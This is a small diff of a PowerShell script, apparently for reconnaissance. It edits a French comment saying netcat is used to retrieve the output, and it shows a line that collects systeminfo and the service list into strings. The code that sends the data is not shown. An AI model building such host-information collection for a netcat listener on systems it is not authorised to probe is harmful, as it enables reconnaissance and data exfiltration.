@@ -1,5 +1,5 @@
 
-#Attention utilisation de netcat pour recuperer le flux 
+#Attention utilisation de netcat pour recuperer le flux -- Script Powershell retrocompatbile (v2/3/4/5/6)
 
 $infos = systeminfo;$task = Get-Service;$infos = $infos | Out-String;$task = $task | Out-String;
 
